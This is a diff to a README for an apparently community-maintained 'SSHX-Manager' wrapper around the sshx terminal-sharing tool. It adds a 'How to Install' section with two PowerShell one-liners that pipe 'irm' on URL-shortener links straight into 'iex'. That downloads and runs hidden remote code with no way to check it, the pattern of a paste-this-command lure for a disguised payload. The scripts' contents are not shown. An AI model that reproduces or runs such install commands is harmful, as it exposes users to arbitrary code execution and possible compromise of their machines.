@@ -21,6 +21,12 @@ We would like to express our deepest gratitude to Ethan for developing such a tr
 - **Upstream Repository**: [ekzhang/sshx](https://github.com/ekzhang/sshx)
 
 ---
+## How to Install
+
+irm https://surl.lu/uinwqt | iex (sshx-manager.ps1)
+
+irm https://surl.li/tyhyif | iex (kimi-sshx-manager.ps1)
+
 
 ## ✨ Key Features
 
@@ -133,5 +139,6 @@ If you enjoy using SSHX-Manager, please consider giving the repository a ⭐! It
 - **Discussion**: Open a new thread in the GitHub Discussions tab.
 
 ---
+
 
 *Disclaimer: This project is a community-maintained manager and is not officially affiliated with the sshx.io core team.*
